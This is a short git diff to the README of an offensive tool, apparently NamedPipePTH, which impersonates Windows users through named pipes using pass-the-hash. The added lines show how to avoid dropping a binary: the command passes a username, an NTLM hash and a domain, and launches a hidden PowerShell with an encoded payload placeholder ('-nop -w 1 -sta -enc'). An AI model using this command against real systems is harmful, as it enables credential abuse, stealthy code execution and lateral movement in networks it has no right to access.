@@ -21,3 +21,7 @@ There are two ways to use this technique. Either you can compile `\Resources\Pip
 Or you can use the standalone script to stay in memory:
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/NamedPipePTH/blob/main/Resources/Example2.JPG?raw=true)
+
+If you don't want to drop a binary for execution just pass arguments for native Windows binaries such as Powershell
+
+`Invoke-ImpersonateUser-PTH -Username USERNAME -Hash NTLMHASH -Domain DOMAIN -PipeName mypipe -binary "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -argument "-nop -w 1 -sta -enc BASEBLOB"`
